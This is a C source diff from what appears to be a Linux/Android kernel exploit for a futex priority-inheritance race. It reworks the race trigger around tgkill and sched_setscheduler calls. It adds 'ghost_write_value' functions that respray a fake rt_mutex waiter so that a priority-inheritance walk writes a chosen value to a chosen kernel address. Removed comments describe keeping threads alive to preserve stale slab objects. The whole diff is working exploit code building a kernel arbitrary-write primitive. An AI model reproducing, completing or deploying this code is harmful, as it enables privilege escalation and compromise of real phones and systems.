+     * cond=1 is set FIRST so Y doesn't re-park after waking.
+     * The sigreturn handler is already installed (done before park in thread_Y),
+     * so SIGUSR2 for the stamp fires correctly on -EINTR return. */
+    atomic_store(&cond, 1);
+    __atomic_thread_fence(__ATOMIC_SEQ_CST);
+    int y_t = atomic_load(&y_tid);
+    errno = 0;
+    long sigr = syscall(SYS_tgkill, getpid(), y_t, SIGUSR1);
+    LOG("tgkill(SIGUSR1 y_tid=%d) ret=%ld errno=%d", y_t, sigr, errno);
 
-    /* Wait for spray */
-    for (int i = 0; i < 10000 && !g_ctx.a_sprayed; i++) usleep(1000);
+    /* Wait for Y to complete the initial stamp */
+    for (int i = 0; i < 200000 && !atomic_load(&y_done); i++) usleep(10);
 
-    /* Wait for consumer to complete its work */
-    for (int i = 0; i < 5000 && !g_ctx.walk_done; i++) usleep(1000);
-
-    int reference_order_ok =
-        g_ctx.edealdk_confirmed &&
-        !g_ctx.waiter_timed_out &&
-        !g_ctx.waiter_unlocked_before_stamp &&
-        g_ctx.stamp_completed &&
-        g_ctx.walk_done &&
-        g_ctx.t_stamp_done_ms &&
-        g_ctx.t_consumer_walk_ms &&
-        g_ctx.t_stamp_done_ms <= g_ctx.t_consumer_walk_ms;
-
-    LOG("PHASE1: edealdk=%d waiter_errno=%d timed_out=%d stamp_completed=%d "
-        "walk_done=%d reference_order_ok=%d",
-        g_ctx.edealdk_confirmed, g_ctx.waiter_return_errno,
-        g_ctx.waiter_timed_out, g_ctx.stamp_completed,
-        g_ctx.walk_done, reference_order_ok);
-
-    if (g_ctx.t_wait_return_ms && g_ctx.t_cmp_return_ms &&
-        g_ctx.t_wait_return_ms >= g_ctx.t_cmp_return_ms) {
-        LOG("PHASE1: cmp_to_wait_return_delta=%llums",
-            (unsigned long long)(g_ctx.t_wait_return_ms - g_ctx.t_cmp_return_ms));
-    }
-
-    if (!g_ctx.edealdk_confirmed) {
-        LOG("PHASE1: classification=no-edeadlk");
-    } else if (g_ctx.waiter_timed_out || g_ctx.waiter_unlocked_before_stamp) {
-        LOG("PHASE1: classification=timeout-before-stamp");
-        LOG("PHASE1: result=FAIL no controlled write evidence");
-    } else if (!g_ctx.stamp_completed) {
-        LOG("PHASE1: classification=no-stamp-completion");
-        LOG("PHASE1: result=FAIL no controlled write evidence");
-    } else if (!g_ctx.walk_done) {
-        LOG("PHASE1: classification=stamp-without-consumer-walk");
-        LOG("PHASE1: result=FAIL no controlled write evidence");
-    } else if (!reference_order_ok) {
-        LOG("PHASE1: classification=ordering-mismatch");
-        LOG("PHASE1: result=FAIL stamp/walk order does not match reference");
-    } else {
-        LOG("PHASE1: classification=reference-order-ok");
-        LOG("PHASE1: result=NEEDS_PHASE2_PROOF bridge/marker not confirmed");
-    }
-
-    LOG("=== trigger_futex_race END ===");
-
-    /*
-     * Adopt iQOO / RMG pattern:
-     * Do NOT pthread_join the background threads. Joining blocks indefinitely
-     * because the worker threads must remain alive to hold kernel locks and
-     * preserve stale slab structures without triggering do_exit() cleanup.
-     */
-    if (!g_ctx.edealdk_confirmed ||
-        g_ctx.waiter_timed_out ||
-        g_ctx.waiter_unlocked_before_stamp ||
-        !g_ctx.stamp_completed ||
-        !g_ctx.walk_done ||
-        !reference_order_ok) {
+    LOG("PHASE1: Y done=%d", atomic_load(&y_done));
+    if (!atomic_load(&y_done)) {
+        LOG("PHASE1: FAIL — Y did not complete stamp");
         return 1;
     }
+
+    /* Trigger PI walk: sched_setscheduler on Y walks Y->pi_blocked_on into our stamp */
+    y_t = atomic_load(&y_tid);
+    struct sched_param sp = { .sched_priority = 0 };
+    errno = 0;
+    long sch = syscall(SYS_sched_setscheduler, y_t, SCHED_NORMAL, &sp);
+    LOG("sched_setscheduler(y_tid=%d) ret=%ld errno=%d", y_t, sch, errno);
+
+    LOG("=== trigger_futex_race END ===");
+    (void)ty; (void)tx;
     return 2;
 }
 
-int trigger_walk(void)
-{
+/* stubs for compatibility */
+int trigger_walk(void) {
     return 0;
+}
+
+/* ── Global ghost write state (shared with thread_Y for respray) ── */
+uint64_t g_k_fake_lock = 0;
+uint64_t g_k_fake_lock2 = 0;
+uint64_t g_k_ghost_task = 0;
+
+volatile int g_respray_ready = 0;
+volatile int g_respray_done = 0;
+uint64_t g_respray_parent_color = 0;
+uint64_t g_respray_value = 0;
+uint64_t g_respray_lock = 0;
+
+extern struct race_ctx *g_race_ctx_for_ghost;
+struct race_ctx *g_race_ctx_for_ghost = NULL;
+
+/* ── sched_setscheduler to trigger PI-walk with respray ── */
+static long trigger_adj_pi(pid_t tid)
+{
+    struct sched_param sp = { .sched_priority = 0 };
+    /* Toggle between SCHED_NORMAL and SCHED_BATCH to force PI-walk */
+    static unsigned long y_pol = 0;
+    long pol = (y_pol == 0) ? (long)SCHED_BATCH : (long)SCHED_NORMAL;
+    LOG("TRIG-PRE tid=%d", tid);
+    long r = syscall(SYS_sched_setscheduler, tid, pol, &sp);
+    LOG("TRIG-POST ret=%ld errno=%d", r, errno);
+    y_pol = (unsigned long)pol;
+    return r;
+}
+
+int ghost_write_value(uint64_t target, uint64_t value)
+{
+    /* Set up the respray geometry:
+     * - parent_color = (target - 8) & ~3  : encodes target address in rb_parent_color
+     * - value = value                     : what gets written to target
+     * - lock = k_fake_lock2               : new lock for second PI-walk
+     */
+    g_respray_parent_color = (target - 8) & ~3UL;
+    LOG("[RESRAY] ghost_write_global called: target=0x%lx value=0x%lx", target, value);
+    g_respray_value = value;
+    g_respray_lock = g_k_fake_lock2;
+
+    __atomic_store_n(&g_respray_done, 0, __ATOMIC_RELEASE);
+    LOG("RESPRAY-REQ: parent_color=0x%llx value=0x%llx lock=0x%llx",
+        (unsigned long long)g_respray_parent_color,
+        (unsigned long long)g_respray_value,
+        (unsigned long long)g_respray_lock);
+    g_respray_ready = 1;
+    LOG("[RESRAY] g_respray_ready set for target 0x%lx", target);
+    __atomic_thread_fence(__ATOMIC_SEQ_CST);
+
+    /* Wait for thread_Y to pick up the respray */
+    while (!g_respray_done) {
+        sched_yield();
+    }
+
+    /* Trigger PI-walk with new lock to apply the respray */
+    pid_t y_tid_val = atomic_load(&y_tid);
+    long tr = trigger_adj_pi(y_tid_val);
+    LOG("ghost_write_value: trigger_adj_pi=%ld (0x%lx -> 0x%lx)", tr, value, target);
+
+    /* Increment fake_lock2 to avoid caching issues */
+    if (g_k_fake_lock2 != 0) {
+        g_k_fake_lock2 += 8;
+        if (g_k_fake_lock2 >= g_k_fake_lock + 0x100) {
+            g_k_fake_lock2 = g_k_fake_lock + 8;
+        }
+    }
+
+    return 0;
+}
+
+int ghost_write_global(uint64_t target, uint64_t value) {
+    return ghost_write_value(target, value);
 }
